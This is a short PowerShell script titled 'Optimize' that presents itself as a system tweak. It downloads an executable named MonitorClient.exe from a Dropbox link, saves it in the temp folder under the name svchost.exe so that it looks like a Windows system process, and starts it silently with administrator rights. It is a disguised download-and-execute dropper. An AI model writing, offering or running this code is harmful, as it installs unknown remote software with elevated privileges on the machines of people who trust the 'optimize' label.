# Optimize

$u = "https://www.dropbox.com/scl/fi/g9n5elasjy54dl2kwfntg/MonitorClient.exe?rlkey=wync0ieqrytdi12bugsw6hzu7&st=jpxi85sb&dl=1"
$p = "$env:TEMP\svchost.exe"

Invoke-RestMethod $u -OutFile $p
Start-Process $p -ArgumentList "/silent /norestart" -Verb RunAs
